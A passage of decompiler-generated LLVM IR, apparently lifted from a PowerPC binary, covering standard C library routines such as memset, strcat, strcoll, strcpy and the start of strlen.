  store i32 %v1_10004ce8, i32* @r11, align 4
  br i1 %v4_10004ce0, label %dec_label_pc_10004d10, label %dec_label_pc_10004cf0

dec_label_pc_10004cf0:                            ; preds = %entry
  %v1_10004cf0 = urem i32 %v1_10004ce8, 4
  %v3_10004cf0 = icmp eq i32 %v1_10004cf0, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10004cf0, label %dec_label_pc_10004cf8, label %dec_label_pc_10004d4c

dec_label_pc_10004cf8:                            ; preds = %dec_label_pc_10004d6c.dec_label_pc_10004cf8_crit_edge, %dec_label_pc_10004cf0
  %v1_10004d04.pre = phi i32 [ %v1_10004ce8, %dec_label_pc_10004cf0 ], [ %v1_10004d04.pre.pre, %dec_label_pc_10004d6c.dec_label_pc_10004cf8_crit_edge ]
  %v0_10004cf8 = phi i32 [ %v1_10004ce0, %dec_label_pc_10004cf0 ], [ %v1_10004d6c, %dec_label_pc_10004d6c.dec_label_pc_10004cf8_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10004cf0 ], [ %v2_10004d54, %dec_label_pc_10004d6c.dec_label_pc_10004cf8_crit_edge ]
  store i32 %v0_10004cf8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10004cfc

dec_label_pc_10004cfc:                            ; preds = %dec_label_pc_10004cfc, %dec_label_pc_10004cf8
  %v1_10004d04 = phi i32 [ %v2_10004d08, %dec_label_pc_10004cfc ], [ %v1_10004d04.pre, %dec_label_pc_10004cf8 ]
  %v0_10004cfc = load i32, i32* %r4.global-to-local, align 4
  %v1_10004cfc = add i32 %v0_10004cfc, 4
  %v2_10004cfc = inttoptr i32 %v1_10004cfc to i32*
  %v3_10004cfc = load i32, i32* %v2_10004cfc, align 4
  %v1_10004d00 = add i32 %v0_10004cfc, 8
  %v2_10004d00 = inttoptr i32 %v1_10004d00 to i32*
  %v3_10004d00 = load i32, i32* %v2_10004d00, align 4
  store i32 %v3_10004d00, i32* %r9.global-to-local, align 4
  store i32 %v1_10004d00, i32* %r4.global-to-local, align 4
  %v2_10004d04 = add i32 %v1_10004d04, 4
  %v3_10004d04 = inttoptr i32 %v2_10004d04 to i32*
  store i32 %v3_10004cfc, i32* %v3_10004d04, align 4
  %v0_10004d08 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004d08 = load i32, i32* @r11, align 4
  %v2_10004d08 = add i32 %v1_10004d08, 8
  %v3_10004d08 = inttoptr i32 %v2_10004d08 to i32*
  store i32 %v0_10004d08, i32* %v3_10004d08, align 4
  store i32 %v2_10004d08, i32* @r11, align 4
  %v0_10004d0c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004d0c = add i32 %v0_10004d0c, -1
  store i32 %v1_10004d0c, i32* %ctr.global-to-local, align 4
  %v2_10004d0c = icmp eq i32 %v1_10004d0c, 0
  br i1 %v2_10004d0c, label %dec_label_pc_10004d10, label %dec_label_pc_10004cfc

dec_label_pc_10004d10:                            ; preds = %dec_label_pc_10004cfc, %dec_label_pc_10004d6c, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_10004d54, %dec_label_pc_10004d6c ], [ %.0, %dec_label_pc_10004cfc ]
  %v1_10004d10 = urem i32 %.1, 8
  store i32 %v1_10004d10, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10004d10, 4
  br i1 %tmp, label %dec_label_pc_10004d28, label %dec_label_pc_10004d1c

dec_label_pc_10004d1c:                            ; preds = %dec_label_pc_10004d10
  %v0_10004d1c = load i32, i32* %r4.global-to-local, align 4
  %v1_10004d1c = add i32 %v0_10004d1c, 4
  %v2_10004d1c = inttoptr i32 %v1_10004d1c to i32*
  %v3_10004d1c = load i32, i32* %v2_10004d1c, align 4
  store i32 %v1_10004d1c, i32* %r4.global-to-local, align 4
  %v1_10004d20 = add nsw i32 %v1_10004d10, -4
  store i32 %v1_10004d20, i32* @r5, align 4
  %v1_10004d24 = load i32, i32* @r11, align 4
  %v2_10004d24 = add i32 %v1_10004d24, 4
  %v3_10004d24 = inttoptr i32 %v2_10004d24 to i32*
  store i32 %v3_10004d1c, i32* %v3_10004d24, align 4
  store i32 %v2_10004d24, i32* @r11, align 4
  %v0_10004d28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10004d28

dec_label_pc_10004d28:                            ; preds = %dec_label_pc_10004d10, %dec_label_pc_10004d1c
  %v0_10004d28 = phi i32 [ %v1_10004d10, %dec_label_pc_10004d10 ], [ %v0_10004d28.pre, %dec_label_pc_10004d1c ]
  %v3_10004d28 = icmp eq i32 %v0_10004d28, 0
  %v0_10004d2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004d28, i32 %v0_10004d2c)
  %v0_10004d30 = load i32, i32* @r5, align 4
  store i32 %v0_10004d30, i32* %ctr.global-to-local, align 4
  %v0_10004d34 = load i32, i32* %r4.global-to-local, align 4
  %v1_10004d34 = add i32 %v0_10004d34, 3
  store i32 %v1_10004d34, i32* %r4.global-to-local, align 4
  %v0_10004d38 = load i32, i32* @r11, align 4
  %v1_10004d38 = add i32 %v0_10004d38, 3
  store i32 %v1_10004d38, i32* %r9.global-to-local, align 4
  %v1_10004d3c9 = add i32 %v0_10004d34, 4
  %v2_10004d3c10 = inttoptr i32 %v1_10004d3c9 to i8*
  %v3_10004d3c11 = load i8, i8* %v2_10004d3c10, align 1
  store i32 %v1_10004d3c9, i32* %r4.global-to-local, align 4
  %v3_10004d4013 = add i32 %v0_10004d38, 4
  %v4_10004d4014 = inttoptr i32 %v3_10004d4013 to i8*
  store i8 %v3_10004d3c11, i8* %v4_10004d4014, align 1
  store i32 %v3_10004d4013, i32* %r9.global-to-local, align 4
  %v0_10004d4415 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004d4416 = add i32 %v0_10004d4415, -1
  store i32 %v1_10004d4416, i32* %ctr.global-to-local, align 4
  %v2_10004d4417 = icmp eq i32 %v1_10004d4416, 0
  br i1 %v2_10004d4417, label %dec_label_pc_10004d78, label %dec_label_pc_10004d3c.dec_label_pc_10004d3c_crit_edge

dec_label_pc_10004d3c.dec_label_pc_10004d3c_crit_edge: ; preds = %dec_label_pc_10004d28, %dec_label_pc_10004d3c.dec_label_pc_10004d3c_crit_edge
  %v3_10004d4018 = phi i32 [ %v3_10004d40, %dec_label_pc_10004d3c.dec_label_pc_10004d3c_crit_edge ], [ %v3_10004d4013, %dec_label_pc_10004d28 ]
  %v0_10004d3c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10004d3c = add i32 %v0_10004d3c.pre, 1
  %v2_10004d3c = inttoptr i32 %v1_10004d3c to i8*
  %v3_10004d3c = load i8, i8* %v2_10004d3c, align 1
  store i32 %v1_10004d3c, i32* %r4.global-to-local, align 4
  %v3_10004d40 = add i32 %v3_10004d4018, 1
  %v4_10004d40 = inttoptr i32 %v3_10004d40 to i8*
  store i8 %v3_10004d3c, i8* %v4_10004d40, align 1
  store i32 %v3_10004d40, i32* %r9.global-to-local, align 4
  %v0_10004d44 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004d44 = add i32 %v0_10004d44, -1
  store i32 %v1_10004d44, i32* %ctr.global-to-local, align 4
  %v2_10004d44 = icmp eq i32 %v1_10004d44, 0
  br i1 %v2_10004d44, label %dec_label_pc_10004d78, label %dec_label_pc_10004d3c.dec_label_pc_10004d3c_crit_edge

dec_label_pc_10004d4c:                            ; preds = %dec_label_pc_10004cf0
  %v1_10004d4c = sub nsw i32 4, %v1_10004cf0
  store i32 %v1_10004d4c, i32* %ctr.global-to-local, align 4
  %v1_10004d54 = load i32, i32* @r5, align 4
  %v2_10004d54 = sub i32 %v1_10004d54, %v1_10004d4c
  br label %dec_label_pc_10004d58

dec_label_pc_10004d58:                            ; preds = %dec_label_pc_10004d58.dec_label_pc_10004d58_crit_edge, %dec_label_pc_10004d4c
  %v2_10004d60 = phi i32 [ %v1_10004d64, %dec_label_pc_10004d58.dec_label_pc_10004d58_crit_edge ], [ %v1_10004ce8, %dec_label_pc_10004d4c ]
  %v0_10004d58 = phi i32 [ %v0_10004d58.pre, %dec_label_pc_10004d58.dec_label_pc_10004d58_crit_edge ], [ %v1_10004ce4, %dec_label_pc_10004d4c ]
  %v1_10004d58 = add i32 %v0_10004d58, 4
  %v2_10004d58 = inttoptr i32 %v1_10004d58 to i8*
  %v3_10004d58 = load i8, i8* %v2_10004d58, align 1
  %v1_10004d5c = add i32 %v0_10004d58, 1
  store i32 %v1_10004d5c, i32* %r4.global-to-local, align 4
  %v3_10004d60 = add i32 %v2_10004d60, 4
  %v4_10004d60 = inttoptr i32 %v3_10004d60 to i8*
  store i8 %v3_10004d58, i8* %v4_10004d60, align 1
  %v0_10004d64 = load i32, i32* @r11, align 4
  %v1_10004d64 = add i32 %v0_10004d64, 1
  store i32 %v1_10004d64, i32* @r11, align 4
  %v0_10004d68 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004d68 = add i32 %v0_10004d68, -1
  store i32 %v1_10004d68, i32* %ctr.global-to-local, align 4
  %v2_10004d68 = icmp eq i32 %v1_10004d68, 0
  br i1 %v2_10004d68, label %dec_label_pc_10004d6c, label %dec_label_pc_10004d58.dec_label_pc_10004d58_crit_edge

dec_label_pc_10004d58.dec_label_pc_10004d58_crit_edge: ; preds = %dec_label_pc_10004d58
  %v0_10004d58.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10004d58

dec_label_pc_10004d6c:                            ; preds = %dec_label_pc_10004d58
  %v1_10004d6c = call i32 @__asm_rlwinm.(i32 %v2_10004d54, i32 29, i32 3, i32 31)
  store i32 %v1_10004d6c, i32* %r9.global-to-local, align 4
  %v4_10004d6c = icmp eq i32 %v1_10004d6c, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_10004d6c, label %dec_label_pc_10004d10, label %dec_label_pc_10004d6c.dec_label_pc_10004cf8_crit_edge

dec_label_pc_10004d6c.dec_label_pc_10004cf8_crit_edge: ; preds = %dec_label_pc_10004d6c
  %v1_10004d04.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10004cf8

dec_label_pc_10004d78:                            ; preds = %dec_label_pc_10004d3c.dec_label_pc_10004d3c_crit_edge, %dec_label_pc_10004d28
  %v0_10004d78 = load i32, i32* @r3, align 4
  ret i32 %v0_10004d78

; uselistorder directives
  uselistorder i32 %v1_10004d6c, { 1, 2, 0 }
  uselistorder i32 %v1_10004d68, { 1, 0 }
  uselistorder i32 %v1_10004d64, { 1, 0 }
  uselistorder i32 %v0_10004d58, { 1, 0 }
  uselistorder i32 %v2_10004d54, { 2, 1, 0 }
  uselistorder i32 %v1_10004d44, { 1, 0 }
  uselistorder i32 %v3_10004d40, { 1, 2, 0 }
  uselistorder i32 %v1_10004d10, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10004d0c, { 1, 0 }
  uselistorder i32 %v2_10004d08, { 1, 2, 0 }
  uselistorder i32 %v1_10004cf0, { 1, 0 }
  uselistorder i32 %v1_10004ce8, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10004d3c.dec_label_pc_10004d3c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10004d28, { 1, 0 }
  uselistorder label %dec_label_pc_10004d10, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10004d7c = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10004d7c, i32* %r9.global-to-local, align 4
  %v4_10004d7c = icmp eq i32 %v1_10004d7c, 0
  %v1_10004d84 = add i32 %arg1, -4
  store i32 %v1_10004d84, i32* %r11.global-to-local, align 4
  %v1_10004d88 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10004d8c = call i32 @__asm_rlwimi(i32 %v1_10004d88, i32 16, i32 0, i32 15)
  %v2_10004d8c = trunc i32 %v1_10004d8c to i8
  br i1 %v4_10004d7c, label %dec_label_pc_10004db4, label %dec_label_pc_10004d94

dec_label_pc_10004d94:                            ; preds = %entry
  %v0_10004d94 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004d94 = urem i32 %v0_10004d94, 4
  %v3_10004d94 = icmp eq i32 %v1_10004d94, 0
  br i1 %v3_10004d94, label %dec_label_pc_10004d94.dec_label_pc_10004d9c_crit_edge, label %dec_label_pc_10004de4

dec_label_pc_10004d94.dec_label_pc_10004d9c_crit_edge: ; preds = %dec_label_pc_10004d94
  %v0_10004d9c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004d9c

dec_label_pc_10004d9c:                            ; preds = %dec_label_pc_10004dfc.dec_label_pc_10004d9c_crit_edge, %dec_label_pc_10004d94.dec_label_pc_10004d9c_crit_edge
  %v0_10004da0.pre = phi i32 [ %v0_10004d94, %dec_label_pc_10004d94.dec_label_pc_10004d9c_crit_edge ], [ %v0_10004da0.pre.pre, %dec_label_pc_10004dfc.dec_label_pc_10004d9c_crit_edge ]
  %v0_10004d9c = phi i32 [ %v0_10004d9c.pre, %dec_label_pc_10004d94.dec_label_pc_10004d9c_crit_edge ], [ %v1_10004dfc, %dec_label_pc_10004dfc.dec_label_pc_10004d9c_crit_edge ]
  store i32 %v0_10004d9c, i32* %ctr.global-to-local, align 4
  %v1_10004da4 = sext i8 %v2_10004d8c to i32
  br label %dec_label_pc_10004da0

dec_label_pc_10004da0:                            ; preds = %dec_label_pc_10004da0, %dec_label_pc_10004d9c
  %v0_10004da0 = phi i32 [ %v1_10004dac, %dec_label_pc_10004da0 ], [ %v0_10004da0.pre, %dec_label_pc_10004d9c ]
  %v1_10004da0 = add i32 %v0_10004da0, 4
  store i32 %v1_10004da0, i32* %r9.global-to-local, align 4
  %v4_10004da4 = inttoptr i32 %v1_10004da0 to i32*
  store i32 %v1_10004da4, i32* %v4_10004da4, align 4
  %v2_10004da8 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004da8 = add i32 %v2_10004da8, 4
  %v4_10004da8 = inttoptr i32 %v3_10004da8 to i32*
  store i32 %v1_10004da4, i32* %v4_10004da8, align 4
  %v0_10004dac = load i32, i32* %r9.global-to-local, align 4
  %v1_10004dac = add i32 %v0_10004dac, 4
  store i32 %v1_10004dac, i32* %r11.global-to-local, align 4
  %v0_10004db0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004db0 = add i32 %v0_10004db0, -1
  store i32 %v1_10004db0, i32* %ctr.global-to-local, align 4
  %v2_10004db0 = icmp eq i32 %v1_10004db0, 0
  br i1 %v2_10004db0, label %dec_label_pc_10004db4, label %dec_label_pc_10004da0

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004da0, %dec_label_pc_10004dfc, %entry
  %v0_10004db4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10004db4 = urem i32 %v0_10004db4, 8
  store i32 %v1_10004db4, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10004db4, 4
  br i1 %tmp, label %dec_label_pc_10004dc8, label %dec_label_pc_10004dc0

dec_label_pc_10004dc0:                            ; preds = %dec_label_pc_10004db4
  %v1_10004dc0 = sext i8 %v2_10004d8c to i32
  %v2_10004dc0 = load i32, i32* %r11.global-to-local, align 4
  %v3_10004dc0 = add i32 %v2_10004dc0, 4
  %v4_10004dc0 = inttoptr i32 %v3_10004dc0 to i32*
  store i32 %v1_10004dc0, i32* %v4_10004dc0, align 4
  store i32 %v3_10004dc0, i32* %r11.global-to-local, align 4
  %v0_10004dc4 = load i32, i32* @r5, align 4
  %v1_10004dc4 = add i32 %v0_10004dc4, -4
  store i32 %v1_10004dc4, i32* @r5, align 4
  br label %dec_label_pc_10004dc8

dec_label_pc_10004dc8:                            ; preds = %dec_label_pc_10004db4, %dec_label_pc_10004dc0
  %v0_10004dc8 = phi i32 [ %v1_10004db4, %dec_label_pc_10004db4 ], [ %v1_10004dc4, %dec_label_pc_10004dc0 ]
  %v3_10004dc8 = icmp eq i32 %v0_10004dc8, 0
  %v0_10004dcc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004dc8, i32 %v0_10004dcc)
  %v0_10004dd0 = load i32, i32* @r5, align 4
  store i32 %v0_10004dd0, i32* %ctr.global-to-local, align 4
  %v0_10004dd4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004dd4 = add i32 %v0_10004dd4, 3
  store i32 %v1_10004dd4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004dd8

dec_label_pc_10004dd8:                            ; preds = %dec_label_pc_10004dd8, %dec_label_pc_10004dc8
  %v3_10004dd8 = phi i32 [ %v4_10004dd8, %dec_label_pc_10004dd8 ], [ %v1_10004dd4, %dec_label_pc_10004dc8 ]
  %v4_10004dd8 = add i32 %v3_10004dd8, 1
  %v5_10004dd8 = inttoptr i32 %v4_10004dd8 to i8*
  store i8 %v2_10004d8c, i8* %v5_10004dd8, align 1
  store i32 %v4_10004dd8, i32* %r9.global-to-local, align 4
  %v0_10004ddc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004ddc = add i32 %v0_10004ddc, -1
  store i32 %v1_10004ddc, i32* %ctr.global-to-local, align 4
  %v2_10004ddc = icmp eq i32 %v1_10004ddc, 0
  br i1 %v2_10004ddc, label %dec_label_pc_10004e08, label %dec_label_pc_10004dd8

dec_label_pc_10004de4:                            ; preds = %dec_label_pc_10004d94
  %v1_10004de4 = sub nsw i32 4, %v1_10004d94
  store i32 %v1_10004de4, i32* %ctr.global-to-local, align 4
  %v1_10004dec = load i32, i32* %r5.global-to-local, align 4
  %v2_10004dec = sub i32 %v1_10004dec, %v1_10004de4
  store i32 %v2_10004dec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10004df0

dec_label_pc_10004df0:                            ; preds = %dec_label_pc_10004df0, %dec_label_pc_10004de4
  %v3_10004df0 = phi i32 [ %v1_10004df4, %dec_label_pc_10004df0 ], [ %v0_10004d94, %dec_label_pc_10004de4 ]
  %v4_10004df0 = add i32 %v3_10004df0, 4
  %v5_10004df0 = inttoptr i32 %v4_10004df0 to i8*
  store i8 %v2_10004d8c, i8* %v5_10004df0, align 1
  %v0_10004df4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004df4 = add i32 %v0_10004df4, 1
  store i32 %v1_10004df4, i32* %r11.global-to-local, align 4
  %v0_10004df8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004df8 = add i32 %v0_10004df8, -1
  store i32 %v1_10004df8, i32* %ctr.global-to-local, align 4
  %v2_10004df8 = icmp eq i32 %v1_10004df8, 0
  br i1 %v2_10004df8, label %dec_label_pc_10004dfc, label %dec_label_pc_10004df0

dec_label_pc_10004dfc:                            ; preds = %dec_label_pc_10004df0
  %v0_10004dfc = load i32, i32* %r5.global-to-local, align 4
  %v1_10004dfc = call i32 @__asm_rlwinm.(i32 %v0_10004dfc, i32 29, i32 3, i32 31)
  store i32 %v1_10004dfc, i32* %r9.global-to-local, align 4
  %v4_10004dfc = icmp eq i32 %v1_10004dfc, 0
  br i1 %v4_10004dfc, label %dec_label_pc_10004db4, label %dec_label_pc_10004dfc.dec_label_pc_10004d9c_crit_edge

dec_label_pc_10004dfc.dec_label_pc_10004d9c_crit_edge: ; preds = %dec_label_pc_10004dfc
  %v0_10004da0.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004d9c

dec_label_pc_10004e08:                            ; preds = %dec_label_pc_10004dd8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10004dfc, { 1, 2, 0 }
  uselistorder i32 %v1_10004df8, { 1, 0 }
  uselistorder i32 %v1_10004df4, { 1, 0 }
  uselistorder i32 %v1_10004ddc, { 1, 0 }
  uselistorder i32 %v4_10004dd8, { 1, 2, 0 }
  uselistorder i32 %v1_10004db4, { 2, 1, 0 }
  uselistorder i32 %v1_10004db0, { 1, 0 }
  uselistorder i32 %v1_10004dac, { 1, 0 }
  uselistorder i32 %v1_10004d94, { 1, 0 }
  uselistorder i32 %v0_10004d94, { 2, 1, 0 }
  uselistorder i8 %v2_10004d8c, { 1, 3, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 6, 7, 0, 4, 1, 5, 8 }
  uselistorder i32* %ctr.global-to-local, { 3, 4, 5, 6, 7, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_10004dc8, { 1, 0 }
  uselistorder label %dec_label_pc_10004db4, { 1, 0, 2 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10004e10

dec_label_pc_10004e10:                            ; preds = %dec_label_pc_10004e10, %entry
  %v0_10004e10 = phi i32 [ %v1_10004e14, %dec_label_pc_10004e10 ], [ %tmp, %entry ]
  %v1_10004e10 = inttoptr i32 %v0_10004e10 to i8*
  %v2_10004e10 = load i8, i8* %v1_10004e10, align 1
  %v1_10004e14 = add i32 %v0_10004e10, 1
  %v3_10004e18 = icmp eq i8 %v2_10004e10, 0
  store i1 %v3_10004e18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004e18, label %dec_label_pc_10004e20, label %dec_label_pc_10004e10

dec_label_pc_10004e20:                            ; preds = %dec_label_pc_10004e10
  %v1_10004e20 = add i32 %v0_10004e10, -1
  br label %dec_label_pc_10004e24

dec_label_pc_10004e24:                            ; preds = %dec_label_pc_10004e24, %dec_label_pc_10004e20
  %v2_10004e30 = phi i32 [ %v3_10004e30, %dec_label_pc_10004e24 ], [ %v1_10004e20, %dec_label_pc_10004e20 ]
  %v0_10004e24 = load i32, i32* @r4, align 4
  %v1_10004e24 = inttoptr i32 %v0_10004e24 to i8*
  %v2_10004e24 = load i8, i8* %v1_10004e24, align 1
  %v1_10004e28 = add i32 %v0_10004e24, 1
  store i32 %v1_10004e28, i32* @r4, align 4
  %v3_10004e2c = icmp eq i8 %v2_10004e24, 0
  store i1 %v3_10004e2c, i1* %cr7_eq.global-to-local, align 1
  %v3_10004e30 = add i32 %v2_10004e30, 1
  %v4_10004e30 = inttoptr i32 %v3_10004e30 to i8*
  store i8 %v2_10004e24, i8* %v4_10004e30, align 1
  %v0_10004e34 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004e34, label %dec_label_pc_10004e38, label %dec_label_pc_10004e24

dec_label_pc_10004e38:                            ; preds = %dec_label_pc_10004e24
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_10004e30, { 1, 0 }
  uselistorder i32 %v0_10004e10, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10004e48.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10004e40

dec_label_pc_10004e40:                            ; preds = %dec_label_pc_10004e64, %entry
  %v0_10004e48 = phi i32 [ %v1_10004e4c, %dec_label_pc_10004e64 ], [ %v0_10004e48.pre, %entry ]
  %v0_10004e40 = phi i32 [ %v1_10004e44, %dec_label_pc_10004e64 ], [ %tmp, %entry ]
  %v1_10004e40 = inttoptr i32 %v0_10004e40 to i8*
  %v2_10004e40 = load i8, i8* %v1_10004e40, align 1
  %v3_10004e40 = zext i8 %v2_10004e40 to i32
  %v1_10004e48 = inttoptr i32 %v0_10004e48 to i8*
  %v2_10004e48 = load i8, i8* %v1_10004e48, align 1
  %v3_10004e48 = zext i8 %v2_10004e48 to i32
  %v3_10004e50 = icmp eq i8 %v2_10004e40, 0
  br i1 %v3_10004e50, label %dec_label_pc_10004e5c, label %dec_label_pc_10004e64

dec_label_pc_10004e5c:                            ; preds = %dec_label_pc_10004e40
  %v1_10004e5c = sub nsw i32 0, %v3_10004e48
  ret i32 %v1_10004e5c

dec_label_pc_10004e64:                            ; preds = %dec_label_pc_10004e40
  %v4_10004e54 = icmp eq i8 %v2_10004e40, %v2_10004e48
  %v1_10004e4c = add i32 %v0_10004e48, 1
  %v1_10004e44 = add i32 %v0_10004e40, 1
  br i1 %v4_10004e54, label %dec_label_pc_10004e40, label %dec_label_pc_10004e68

dec_label_pc_10004e68:                            ; preds = %dec_label_pc_10004e64
  %v2_10004e68 = sub nsw i32 %v3_10004e40, %v3_10004e48
  ret i32 %v2_10004e68

; uselistorder directives
  uselistorder i32 %v3_10004e48, { 1, 0 }
  uselistorder i32 %v0_10004e40, { 1, 0 }
  uselistorder i32 %v0_10004e48, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10004e70 = add i32 %arg1, -1
  %v1_10004e74 = sub i32 %v2_10004e70, %tmp
  store i32 %v1_10004e74, i32* %r9.global-to-local, align 4
  %v2_10004e784 = load i8, i8* %arg2, align 1
  %v1_10004e7c6 = add i32 %tmp, 1
  store i32 %v1_10004e7c6, i32* %r4.global-to-local, align 4
  %v3_10004e808 = icmp eq i8 %v2_10004e784, 0
  store i1 %v3_10004e808, i1* %cr7_eq.global-to-local, align 1
  %v5_10004e849 = inttoptr i32 %arg1 to i8*
  store i8 %v2_10004e784, i8* %v5_10004e849, align 1
  %v0_10004e8810 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004e8810, label %dec_label_pc_10004e8c, label %dec_label_pc_10004e78.dec_label_pc_10004e78_crit_edge

dec_label_pc_10004e78.dec_label_pc_10004e78_crit_edge: ; preds = %entry, %dec_label_pc_10004e78.dec_label_pc_10004e78_crit_edge
  %v0_10004e78.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_10004e84.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10004e78 = inttoptr i32 %v0_10004e78.pre to i8*
  %v2_10004e78 = load i8, i8* %v1_10004e78, align 1
  %v1_10004e7c = add i32 %v0_10004e78.pre, 1
  store i32 %v1_10004e7c, i32* %r4.global-to-local, align 4
  %v3_10004e80 = icmp eq i8 %v2_10004e78, 0
  store i1 %v3_10004e80, i1* %cr7_eq.global-to-local, align 1
  %v4_10004e84 = add i32 %v1_10004e7c, %v2_10004e84.pre
  %v5_10004e84 = inttoptr i32 %v4_10004e84 to i8*
  store i8 %v2_10004e78, i8* %v5_10004e84, align 1
  %v0_10004e88 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004e88, label %dec_label_pc_10004e8c, label %dec_label_pc_10004e78.dec_label_pc_10004e78_crit_edge

dec_label_pc_10004e8c:                            ; preds = %dec_label_pc_10004e78.dec_label_pc_10004e78_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004e78.dec_label_pc_10004e78_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_10004e90 = load i32, i32* @r3, align 4
  %v1_10004ea83 = urem i32 %v0_10004e90, 4
  %v3_10004ea85 = icmp eq i32 %v1_10004ea83, 0
  br i1 %v3_10004ea85, label %dec_label_pc_10004eb0, label %dec_label_pc_10004e98

dec_label_pc_10004e98:                            ; preds = %entry, %dec_label_pc_10004ea4
  %v0_10004ea4 = phi i32 [ %v1_10004ea4, %dec_label_pc_10004ea4 ], [ %v0_10004e90, %entry ]
  %v1_10004e98 = inttoptr i32 %v0_10004ea4 to i8*
  %v2_10004e98 = load i8, i8* %v1_10004e98, align 1
  %v3_10004e9c = icmp eq i8 %v2_10004e98, 0
  br i1 %v3_10004e9c, label %dec_label_pc_10004ee4, label %dec_label_pc_10004ea4

dec_label_pc_10004ea4:                            ; preds = %dec_label_pc_10004e98
  %v1_10004ea4 = add i32 %v0_10004ea4, 1
  %v1_10004ea8 = urem i32 %v1_10004ea4, 4
  %v3_10004ea8 = icmp eq i32 %v1_10004ea8, 0
  br i1 %v3_10004ea8, label %dec_label_pc_10004eb0, label %dec_label_pc_10004e98

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004ea4, %entry
  %v0_10004eb4 = phi i32 [ %v0_10004e90, %entry ], [ %v1_10004ea4, %dec_label_pc_10004ea4 ]
  br label %dec_label_pc_10004ebc

dec_label_pc_10004ebc:                            ; preds = %dec_label_pc_10004f1c, %dec_label_pc_10004ebc, %dec_label_pc_10004eb0
  %v1_10004ef8 = phi i32 [ %v0_10004eb4, %dec_label_pc_10004eb0 ], [ %v1_10004ec0, %dec_label_pc_10004ebc ], [ %v1_10004ec0, %dec_label_pc_10004f1c ]
  %v1_10004ebc = inttoptr i32 %v1_10004ef8 to i32*
  %v2_10004ebc = load i32, i32* %v1_10004ebc, align 4
